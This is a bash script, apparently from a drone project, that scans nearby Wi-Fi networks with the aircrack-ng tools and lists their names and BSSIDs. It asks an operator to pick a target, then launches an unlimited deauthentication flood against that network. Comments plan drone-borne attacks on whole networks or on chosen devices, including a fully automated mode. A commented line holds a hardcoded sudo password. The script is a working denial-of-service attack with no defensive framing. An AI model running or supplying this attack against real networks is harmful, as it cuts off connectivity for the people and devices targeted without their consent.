#!/bin/bash

#Script for Drone40
#Created by Matt Arrison and Cooper Guzzi
#echo "kalipass" | sudo -S ./deauth-0.sh
bold=$(tput bold)
normal=$(tput sgr0)

echo "p455w0rd"
echo "              //"
echo "              |"
echo "              |"
echo "              |"
echo "//-----5t4rt1n8 5cr1pT------//"
echo "              |"
echo "              |"
echo "              |"
echo "              //"

echo " "
echo "Waiting for drone to get into place..."
sleep 10 #can change values based on how long it will it take to get into place
echo "STARTING RECON!!"
sleep 10

switch="0"

time=10
mkdir scan1
chmod 775 scan1
cd scan1

sudo airmon-ng start wlan0 #Set into monitor mode
sudo iwconfig > iwconfig.txt #output command to file

#parse through output to insure monitor mode is on
grep Monitor iwconfig.txt > monitor.txt #look for 'Monitor' in iwconfig command
cut -b 29-35 monitor.txt > new.txt #extract 
echo "Monitor" > test.txt #create test file ***MAKE ON BOOT***
diff new.txt test.txt > check.txt #check difference

if [ -s check.txt ] #check for monitor mode
then 
	switch = "1"
else
	echo "Monitor mode activated!"
	sleep 10
fi

cd .. #back to home directory
sudo airmon-ng start wlan0 #scan networks

#check if switch == 1
if [ $switch == 1 ]
then
	echo "Abort mission..."
else

	timeout $time sudo airodump-ng -w bigData --output-format csv wlan0
	echo "Your data file has been created in the Arctic-Ghost directory"
	echo "Select the Wi-Fi to you wish to attack..."
fi

#sudo iwconfig wlan0 channel 6

# Print out ESSIDs and BSSIDs of scanned networks and load BSSIDs and ESSIDs into an associative array
declare -A networks
declare -A channels
while IFS=, read -r bssid first last channel speed privacy cipher authentication power numBeacons numIV lanIP lenID essid key
do
	if [[ "$essid" = *[!\ ]* ]]; then
		if [ "$essid" != " ESSID" ]; then
			echo "${bold}ESSID:${normal} $essid ${bold}BSSID:${normal} $bssid"
			networks["$bssid"]="$essid"
			channels["$bssid"]="$channel"
		fi
	fi
done < bigData-01.csv

# Prompt Operator for network to attack:
invalid=true
while $invalid; do
	read -p "Enter BSSID of Network to attack: " targetVar < /dev/tty
	for name in "${!networks[@]}"; do
		if [ $name == $targetVar ]; then
			invalid=false
		fi
	done
	if $invalid; then
		echo "Invalid BSSID entered. Try again."
	fi
done
echo "Attacking network $targetVar"
# set channel to channel the targeted network is on
targetChannel=${channels["$targetVar"]}
# trim leading whitespace
targetChannel=${targetChannel##*( )}
# echo "Target Channel: $targetChannel"
sudo iwconfig wlan0 channel $targetChannel
# send attack to selected network
sudo aireplay-ng --deauth 0 -a $targetVar wlan0
# print contents of associative array
#for name in "${!networks[@]}"; do
	#echo "$name - ${networks[$name]}"
#done

# There are two options for this attack:

# 1) Send the drone back to home base after collecting the wifi data and the operator reads the 
#    csv file to determine exactly what network to attack
#	a) Attack entire network
#		i) Run script 0, send drone to collect data, flys back to HQ, input required 
#		   data into script 1.a, run script 1.a, and deploy drone 
#
#	b) Attack specific device(s) on a network
#		i) Run script 0, send drone to collect data, flys back to HQ, input required 
#		   data into script 1.b, run script 1.b, and deploy drone
#
# 2) The operator inputs the known wifi name into the code before the drone's deployement and 
#    the entire attack process is automated and hands off.
#	a) Attack entire network
#		i) Input victim wifi name into script 2.a, run script 2.a, and deploy drone
#
#	b) Attack specific device(s) on a network
#		i) Input victim wifi name and device credentials, run script 2.b, and deploy drone.
